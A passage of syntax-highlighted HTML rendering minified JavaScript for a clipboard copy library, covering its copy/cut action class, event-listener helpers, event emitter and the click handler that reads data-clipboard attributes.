</span>&#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">var</span> t = <span class="built_in">arguments</span>.length &gt; <span class="number">0</span> &amp;&amp; <span class="keyword">void</span> <span class="number">0</span> !== <span class="built_in">arguments</span>[<span class="number">0</span>] ? <span class="built_in">arguments</span>[<span class="number">0</span>] : &#123;&#125;;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">this</span>.action = t.action, <span class="keyword">this</span>.container = t.container, <span class="keyword">this</span>.emitter = t.emitter, <span class="keyword">this</span>.target = t.target, <span class="keyword">this</span>.text = t.text, <span class="keyword">this</span>.trigger = t.trigger, <span class="keyword">this</span>.selectedText = <span class="string">""</span></span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="javascript">                key: <span class="string">"initSelection"</span>,</span></span><br><span class="line"><span class="javascript">                value: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">this</span>.text ? <span class="keyword">this</span>.selectFake() : <span class="keyword">this</span>.target &amp;&amp; <span class="keyword">this</span>.selectTarget()</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="javascript">                key: <span class="string">"selectFake"</span>,</span></span><br><span class="line"><span class="javascript">                value: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">var</span> t = <span class="keyword">this</span>,</span></span><br><span class="line"><span class="javascript">                    e = <span class="string">"rtl"</span> == <span class="built_in">document</span>.documentElement.getAttribute(<span class="string">"dir"</span>);</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">this</span>.removeFake(), <span class="keyword">this</span>.fakeHandlerCallback = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                      <span class="keyword">return</span> t.removeFake()</span></span><br><span class="line"><span class="javascript">                    &#125;, <span class="keyword">this</span>.fakeHandler = <span class="keyword">this</span>.container.addEventListener(<span class="string">"click"</span>, <span class="keyword">this</span>.fakeHandlerCallback) || !<span class="number">0</span>, <span class="keyword">this</span>.fakeElem = <span class="built_in">document</span>.createElement(<span class="string">"textarea"</span>), <span class="keyword">this</span>.fakeElem.style.fontSize = <span class="string">"12pt"</span>, <span class="keyword">this</span>.fakeElem.style.border =</span></span><br><span class="line"><span class="javascript">                    <span class="string">"0"</span>, <span class="keyword">this</span>.fakeElem.style.padding = <span class="string">"0"</span>, <span class="keyword">this</span>.fakeElem.style.margin = <span class="string">"0"</span>, <span class="keyword">this</span>.fakeElem.style.position = <span class="string">"absolute"</span>, <span class="keyword">this</span>.fakeElem.style[e ? <span class="string">"right"</span> : <span class="string">"left"</span>] = <span class="string">"-9999px"</span>;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">var</span> n = <span class="built_in">window</span>.pageYOffset || <span class="built_in">document</span>.documentElement.scrollTop;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">this</span>.fakeElem.style.top = n + <span class="string">"px"</span>, <span class="keyword">this</span>.fakeElem.setAttribute(<span class="string">"readonly"</span>, <span class="string">""</span>), <span class="keyword">this</span>.fakeElem.value = <span class="keyword">this</span>.text, <span class="keyword">this</span>.container.appendChild(<span class="keyword">this</span>.fakeElem), <span class="keyword">this</span>.selectedText = (<span class="number">0</span>, o.default)(<span class="keyword">this</span>.fakeElem), <span class="keyword">this</span>.copyText()</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="javascript">                key: <span class="string">"removeFake"</span>,</span></span><br><span class="line"><span class="javascript">                value: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">this</span>.fakeHandler &amp;&amp; (<span class="keyword">this</span>.container.removeEventListener(<span class="string">"click"</span>, <span class="keyword">this</span>.fakeHandlerCallback), <span class="keyword">this</span>.fakeHandler = <span class="literal">null</span>, <span class="keyword">this</span>.fakeHandlerCallback = <span class="literal">null</span>), <span class="keyword">this</span>.fakeElem &amp;&amp; (<span class="keyword">this</span>.container.removeChild(<span class="keyword">this</span>.fakeElem),</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">this</span>.fakeElem = <span class="literal">null</span>)</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="javascript">                key: <span class="string">"selectTarget"</span>,</span></span><br><span class="line"><span class="javascript">                value: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">this</span>.selectedText = (<span class="number">0</span>, o.default)(<span class="keyword">this</span>.target), <span class="keyword">this</span>.copyText()</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="javascript">                key: <span class="string">"copyText"</span>,</span></span><br><span class="line"><span class="javascript">                value: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">var</span> t = <span class="keyword">void</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="javascript">                    t = <span class="built_in">document</span>.execCommand(<span class="keyword">this</span>.action)</span></span><br><span class="line"><span class="javascript">                  &#125; <span class="keyword">catch</span> (e) &#123;</span></span><br><span class="line"><span class="undefined">                    t = !1</span></span><br><span class="line"><span class="undefined">                  &#125;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">this</span>.handleResult(t)</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="javascript">                key: <span class="string">"handleResult"</span>,</span></span><br><span class="line"><span class="javascript">                value: <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">this</span>.emitter.emit(t ? <span class="string">"success"</span> : <span class="string">"error"</span>, &#123;</span></span><br><span class="line"><span class="javascript">                    action: <span class="keyword">this</span>.action,</span></span><br><span class="line"><span class="javascript">                    text: <span class="keyword">this</span>.selectedText,</span></span><br><span class="line"><span class="javascript">                    trigger: <span class="keyword">this</span>.trigger,</span></span><br><span class="line"><span class="javascript">                    clearSelection: <span class="keyword">this</span>.clearSelection.bind(<span class="keyword">this</span>)</span></span><br><span class="line"><span class="undefined">                  &#125;)</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="javascript">                key: <span class="string">"clearSelection"</span>,</span></span><br><span class="line"><span class="javascript">                value: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">this</span>.trigger &amp;&amp; <span class="keyword">this</span>.trigger.focus(), <span class="built_in">window</span>.getSelection().removeAllRanges()</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="javascript">                key: <span class="string">"destroy"</span>,</span></span><br><span class="line"><span class="javascript">                value: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">this</span>.removeFake()</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="javascript">                key: <span class="string">"action"</span>,</span></span><br><span class="line"><span class="javascript">                <span class="keyword">set</span>: function() &#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">var</span> t = <span class="built_in">arguments</span>.length &gt; <span class="number">0</span> &amp;&amp; <span class="keyword">void</span> <span class="number">0</span> !== <span class="built_in">arguments</span>[<span class="number">0</span>] ? <span class="built_in">arguments</span>[<span class="number">0</span>] : <span class="string">"copy"</span>;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">if</span> (<span class="keyword">this</span>._action = t, <span class="string">"copy"</span> !== <span class="keyword">this</span>._action &amp;&amp; <span class="string">"cut"</span> !== <span class="keyword">this</span>._action) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Invalid "action" value, use either "copy" or "cut"'</span>)</span></span><br><span class="line"><span class="undefined">                &#125;,</span></span><br><span class="line"><span class="javascript">                <span class="keyword">get</span>: function() &#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">return</span> <span class="keyword">this</span>._action</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="javascript">                key: <span class="string">"target"</span>,</span></span><br><span class="line"><span class="javascript">                <span class="keyword">set</span>: function(t) &#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">if</span> (<span class="keyword">void</span> <span class="number">0</span> !== t) &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">if</span> (!t || <span class="string">"object"</span> !== (<span class="keyword">void</span> <span class="number">0</span> === t ? <span class="string">"undefined"</span> : r(t)) || <span class="number">1</span> !== t.nodeType) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Invalid "target" value, use a valid Element'</span>);</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">if</span> (<span class="string">"copy"</span> === <span class="keyword">this</span>.action &amp;&amp; t.hasAttribute(<span class="string">"disabled"</span>)) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Invalid "target" attribute. Please use "readonly" instead of "disabled" attribute'</span>);</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">if</span> (<span class="string">"cut"</span> === <span class="keyword">this</span>.action &amp;&amp; (t.hasAttribute(<span class="string">"readonly"</span>) || t.hasAttribute(<span class="string">"disabled"</span>))) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Invalid "target" attribute. You can\'t cut text from elements with "readonly" or "disabled" attributes'</span>);</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">this</span>._target = t</span></span><br><span class="line"><span class="undefined">                  &#125;</span></span><br><span class="line"><span class="undefined">                &#125;,</span></span><br><span class="line"><span class="javascript">                <span class="keyword">get</span>: function() &#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">return</span> <span class="keyword">this</span>._target</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;]), t</span></span><br><span class="line"><span class="undefined">            &#125;();</span></span><br><span class="line"><span class="undefined">          t.exports = a</span></span><br><span class="line"><span class="undefined">        &#125;)</span></span><br><span class="line"><span class="javascript">      &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">t, e, n</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params">t, e, n</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">if</span> (!t &amp;&amp; !e &amp;&amp; !n) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Missing required arguments"</span>);</span></span><br><span class="line"><span class="javascript">          <span class="keyword">if</span> (!c.string(e)) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"Second argument must be a String"</span>);</span></span><br><span class="line"><span class="javascript">          <span class="keyword">if</span> (!c.fn(n)) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"Third argument must be a Function"</span>);</span></span><br><span class="line"><span class="javascript">          <span class="keyword">if</span> (c.node(t)) <span class="keyword">return</span> r(t, e, n);</span></span><br><span class="line"><span class="javascript">          <span class="keyword">if</span> (c.nodeList(t)) <span class="keyword">return</span> i(t, e, n);</span></span><br><span class="line"><span class="javascript">          <span class="keyword">if</span> (c.string(t)) <span class="keyword">return</span> a(t, e, n);</span></span><br><span class="line"><span class="javascript">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"First argument must be a String, HTMLElement, HTMLCollection, or NodeList"</span>)</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params">t, e, n</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> t.addEventListener(e, n), &#123;</span></span><br><span class="line"><span class="javascript">            destroy: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">              t.removeEventListener(e, n)</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params">t, e, n</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> <span class="built_in">Array</span>.prototype.forEach.call(t, <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">            t.addEventListener(e, n)</span></span><br><span class="line"><span class="undefined">          &#125;), &#123;</span></span><br><span class="line"><span class="javascript">            destroy: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">              <span class="built_in">Array</span>.prototype.forEach.call(t, <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">                t.removeEventListener(e, n)</span></span><br><span class="line"><span class="undefined">              &#125;)</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">t, e, n</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> u(<span class="built_in">document</span>.body, t, e, n)</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> c = n(<span class="number">6</span>),</span></span><br><span class="line"><span class="undefined">          u = n(5);</span></span><br><span class="line"><span class="undefined">        t.exports = o</span></span><br><span class="line"><span class="javascript">      &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">t, e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>) </span>&#123;&#125;</span></span><br><span class="line"><span class="undefined">        n.prototype = &#123;</span></span><br><span class="line"><span class="javascript">          on: <span class="function"><span class="keyword">function</span>(<span class="params">t, e, n</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> o = <span class="keyword">this</span>.e || (<span class="keyword">this</span>.e = &#123;&#125;);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> (o[t] || (o[t] = [])).push(&#123;</span></span><br><span class="line"><span class="undefined">              fn: e,</span></span><br><span class="line"><span class="undefined">              ctx: n</span></span><br><span class="line"><span class="javascript">            &#125;), <span class="keyword">this</span></span></span><br><span class="line"><span class="undefined">          &#125;,</span></span><br><span class="line"><span class="javascript">          once: <span class="function"><span class="keyword">function</span>(<span class="params">t, e, n</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">              r.off(t, o), e.apply(n, <span class="built_in">arguments</span>)</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> r = <span class="keyword">this</span>;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> o._ = e, <span class="keyword">this</span>.on(t, o, n)</span></span><br><span class="line"><span class="undefined">          &#125;,</span></span><br><span class="line"><span class="javascript">          emit: <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> e = [].slice.call(<span class="built_in">arguments</span>, <span class="number">1</span>),</span></span><br><span class="line"><span class="javascript">              n = ((<span class="keyword">this</span>.e || (<span class="keyword">this</span>.e = &#123;&#125;))[t] || []).slice(),</span></span><br><span class="line"><span class="undefined">              o = 0,</span></span><br><span class="line"><span class="undefined">              r = n.length;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span> (o; o &lt; r; o++) n[o].fn.apply(n[o].ctx, e);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> <span class="keyword">this</span></span></span><br><span class="line"><span class="undefined">          &#125;,</span></span><br><span class="line"><span class="javascript">          off: <span class="function"><span class="keyword">function</span>(<span class="params">t, e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> n = <span class="keyword">this</span>.e || (<span class="keyword">this</span>.e = &#123;&#125;),</span></span><br><span class="line"><span class="undefined">              o = n[t],</span></span><br><span class="line"><span class="undefined">              r = [];</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (o &amp;&amp; e)</span></span><br><span class="line"><span class="javascript">              <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, a = o.length; i &lt; a; i++) o[i].fn !== e &amp;&amp; o[i].fn._ !== e &amp;&amp; r.push(o[i]);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> r.length ? n[t] = r : <span class="keyword">delete</span> n[t], <span class="keyword">this</span></span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined">        &#125;, t.exports = n</span></span><br><span class="line"><span class="javascript">      &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">t, e, n</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> o, r, i;</span></span><br><span class="line"><span class="javascript">        ! <span class="function"><span class="keyword">function</span>(<span class="params">a, c</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          r = [t, n(<span class="number">0</span>), n(<span class="number">2</span>), n(<span class="number">1</span>)], o = c, <span class="keyword">void</span> <span class="number">0</span> !== (i = <span class="string">"function"</span> == <span class="keyword">typeof</span> o ? o.apply(e, r) : o) &amp;&amp; (t.exports = i)</span></span><br><span class="line"><span class="javascript">        &#125;(<span class="number">0</span>, <span class="function"><span class="keyword">function</span>(<span class="params">t, e, n, o</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="meta">          "use strict"</span>;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">          <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> t &amp;&amp; t.__esModule ? t : &#123;</span></span><br><span class="line"><span class="javascript">              <span class="keyword">default</span>: t</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">          <span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params">t, e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (!(t <span class="keyword">instanceof</span> e)) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"Cannot call a class as a function"</span>)</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">          <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">t, e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (!t) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">ReferenceError</span>(<span class="string">"this hasn't been initialised - super() hasn't been called"</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> !e || <span class="string">"object"</span> != <span class="keyword">typeof</span> e &amp;&amp; <span class="string">"function"</span> != <span class="keyword">typeof</span> e ? t : e</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">          <span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params">t, e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (<span class="string">"function"</span> != <span class="keyword">typeof</span> e &amp;&amp; <span class="literal">null</span> !== e) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"Super expression must either be null or a function, not "</span> + <span class="keyword">typeof</span> e);</span></span><br><span class="line"><span class="javascript">            t.prototype = <span class="built_in">Object</span>.create(e &amp;&amp; e.prototype, &#123;</span></span><br><span class="line"><span class="javascript">              <span class="keyword">constructor</span>: &#123;</span></span><br><span class="line"><span class="undefined">                value: t,</span></span><br><span class="line"><span class="undefined">                enumerable: !1,</span></span><br><span class="line"><span class="undefined">                writable: !0,</span></span><br><span class="line"><span class="undefined">                configurable: !0</span></span><br><span class="line"><span class="undefined">              &#125;</span></span><br><span class="line"><span class="javascript">            &#125;), e &amp;&amp; (<span class="built_in">Object</span>.setPrototypeOf ? <span class="built_in">Object</span>.setPrototypeOf(t, e) : t.__proto__ = e)</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">          <span class="function"><span class="keyword">function</span> <span class="title">u</span>(<span class="params">t, e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> n = <span class="string">"data-clipboard-"</span> + t;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (e.hasAttribute(n)) <span class="keyword">return</span> e.getAttribute(n)</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">var</span> l = r(e),</span></span><br><span class="line"><span class="undefined">            s = r(n),</span></span><br><span class="line"><span class="undefined">            f = r(o),</span></span><br><span class="line"><span class="javascript">            d = <span class="string">"function"</span> == <span class="keyword">typeof</span> <span class="built_in">Symbol</span> &amp;&amp; <span class="string">"symbol"</span> == <span class="keyword">typeof</span> <span class="built_in">Symbol</span>.iterator ? <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">              <span class="keyword">return</span> <span class="keyword">typeof</span> t</span></span><br><span class="line"><span class="javascript">            &#125; : <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">              <span class="keyword">return</span> t &amp;&amp; <span class="string">"function"</span> == <span class="keyword">typeof</span> <span class="built_in">Symbol</span> &amp;&amp; t.constructor === <span class="built_in">Symbol</span> &amp;&amp; t !== <span class="built_in">Symbol</span>.prototype ? <span class="string">"symbol"</span> : <span class="keyword">typeof</span> t</span></span><br><span class="line"><span class="undefined">            &#125;,</span></span><br><span class="line"><span class="javascript">            h = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">              <span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params">t, e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="number">0</span>; n &lt; e.length; n++) &#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">var</span> o = e[n];</span></span><br><span class="line"><span class="javascript">                  o.enumerable = o.enumerable || !<span class="number">1</span>, o.configurable = !<span class="number">0</span>, <span class="string">"value"</span> <span class="keyword">in</span> o &amp;&amp; (o.writable = !<span class="number">0</span>), <span class="built_in">Object</span>.defineProperty(t, o.key, o)</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;</span></span><br><span class="line"><span class="javascript">              <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">e, n, o</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> n &amp;&amp; t(e.prototype, n), o &amp;&amp; t(e, o), e</span></span><br><span class="line"><span class="undefined">              &#125;</span></span><br><span class="line"><span class="undefined">            &#125;(),</span></span><br><span class="line"><span class="javascript">            p = <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">              <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params">t, n</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                i(<span class="keyword">this</span>, e);</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> o = a(<span class="keyword">this</span>, (e.__proto__ || <span class="built_in">Object</span>.getPrototypeOf(e)).call(<span class="keyword">this</span>));</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> o.resolveOptions(n), o.listenClick(t), o</span></span><br><span class="line"><span class="undefined">              &#125;</span></span><br><span class="line"><span class="javascript">              <span class="keyword">return</span> c(e, t), h(e, [&#123;</span></span><br><span class="line"><span class="javascript">                key: <span class="string">"resolveOptions"</span>,</span></span><br><span class="line"><span class="javascript">                value: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">var</span> t = <span class="built_in">arguments</span>.length &gt; <span class="number">0</span> &amp;&amp; <span class="keyword">void</span> <span class="number">0</span> !== <span class="built_in">arguments</span>[<span class="number">0</span>] ? <span class="built_in">arguments</span>[<span class="number">0</span>] : &#123;&#125;;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">this</span>.action = <span class="string">"function"</span> == <span class="keyword">typeof</span> t.action ? t.action : <span class="keyword">this</span>.defaultAction, <span class="keyword">this</span>.target = <span class="string">"function"</span> == <span class="keyword">typeof</span> t.target ? t.target : <span class="keyword">this</span>.defaultTarget, <span class="keyword">this</span>.text = <span class="string">"function"</span> == <span class="keyword">typeof</span> t.text ? t.text : <span class="keyword">this</span>.defaultText,</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">this</span>.container = <span class="string">"object"</span> === d(t.container) ? t.container : <span class="built_in">document</span>.body</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="javascript">                key: <span class="string">"listenClick"</span>,</span></span><br><span class="line"><span class="javascript">                value: <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">var</span> e = <span class="keyword">this</span>;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">this</span>.listener = (<span class="number">0</span>, f.default)(t, <span class="string">"click"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">return</span> e.onClick(t)</span></span><br><span class="line"><span class="undefined">                  &#125;)</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="javascript">                key: <span class="string">"onClick"</span>,</span></span><br><span class="line"><span class="javascript">                value: <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">var</span> e = t.delegateTarget || t.currentTarget;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">this</span>.clipboardAction &amp;&amp; (<span class="keyword">this</span>.clipboardAction = <span class="literal">null</span>), <span class="keyword">this</span>.clipboardAction = <span class="keyword">new</span> l.default(&#123;</span></span><br><span class="line"><span class="javascript">                    action: <span class="keyword">this</span>.action(e),</span></span><br><span class="line"><span class="javascript">                    target: <span class="keyword">this</span>.target(e),</span></span><br><span class="line"><span class="javascript">                    text: <span class="keyword">this</span>.text(e),</span></span><br><span class="line"><span class="javascript">                    container: <span class="keyword">this</span>.container,</span></span><br><span class="line"><span class="undefined">                    trigger: e,</span></span><br><span class="line"><span class="javascript">                    emitter: <span class="keyword">this</span></span></span><br><span class="line"><span class="undefined">                  &#125;)</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="javascript">                key: <span class="string">"defaultAction"</span>,</span></span><br><span class="line"><span class="javascript">                value: <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">return</span> u(<span class="string">"action"</span>, t)</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="javascript">                key: <span class="string">"defaultTarget"</span>,</span></span><br><span class="line"><span class="javascript">                value: <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">var</span> e = u(<span class="string">"target"</span>, t);</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">if</span> (e) <span class="keyword">return</span> <span class="built_in">document</span>.querySelector(e)</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="javascript">                key: <span class="string">"defaultText"</span>,</span></span><br><span class="line"><span class="javascript">                value: <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">return</span> u(<span class="string">"text"</span>, t)</span></span><br><span class="line"><span 